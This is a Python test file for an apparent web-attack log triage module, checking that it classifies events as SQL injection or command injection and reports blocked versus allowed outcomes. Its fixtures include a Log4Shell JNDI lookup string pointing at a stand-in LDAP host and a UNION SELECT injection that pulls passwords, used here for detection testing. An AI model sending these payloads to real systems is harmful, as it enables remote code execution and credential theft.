import json

from core.triage import analyze
from core.triage_summary import refresh_attack_summary


def analyze_events(*events):
    return analyze(json.dumps([dict(host='app.test', method='GET', url='/', **e) for e in events]))


def test_header_attack_is_not_lost_and_blocking_does_not_hide_impact():
    result = analyze_events({'headers': {'User-Agent': '${jndi:ldap://example.test/a}'}, 'act': 'Block'})
    event = result['events'][0]
    assert event['category'] == 'cmdi'
    assert event['priority'] == 'low'
    assert event['assessment']['importance'] == 'high'
    assert any('log4shell' in evidence for evidence in event['assessment']['evidence'])
    assert '미확인' in event['assessment']['outcome']


def test_body_and_signature_only_attacks_receive_explanations():
    result = analyze_events({'request_body': 'id=1 UNION SELECT password FROM users', 'act': 'Permit'},
                            {'signature': 'Remote Code Execution', 'act': 'Permit'})
    assert [e['category'] for e in result['events']] == ['sqli', 'cmdi']
    assert all(e['assessment']['rank'] == 0 for e in result['events'])
    assert '장비 탐지명' in result['events'][1]['assessment']['evidence'][0]


def test_unblocked_attack_precedes_blocked_and_counts_are_separate():
    result = analyze_events({'signature': 'XSS', 'act': 'Block'},
                            {'signature': 'RCE', 'act': 'Permit', 'occurrences': 50, 'status': 200},
                            {'signature': 'RCE', 'act': 'Block'})
    first = result['attack_summary']['groups'][0]
    assert first['title'] == '명령 실행 공격'
    assert first['record_count'] == 2 and first['reported_occurrences'] == 50
    assert first['occurrence_records'] == 1
    assert first['actions'] == {'allowed': 1, 'blocked': 1}
    assert '공격 성공 여부 미확인' in result['events'][1]['assessment']['outcome']
    json.dumps(result)


def test_missing_evidence_is_not_reported_as_safe_and_inventory_refreshes_summary():
    result = analyze_events({'act': 'Permit', 'status': 200})
    assert result['events'][0]['assessment']['importance'] == 'unknown'
    result['events'][0]['reasons'].append('IMPORTANT_ASSET')
    refresh_attack_summary(result)
    assert result['attack_summary']['high'] == 1
    assert '중요 자산' in result['events'][0]['assessment']['evidence'][-1]


def test_query_is_classified_after_separate_query_field_is_combined():
    result = analyze_events({'webQuery': 'id=1 UNION SELECT password FROM users'})
    assert result['events'][0]['category'] == 'sqli'
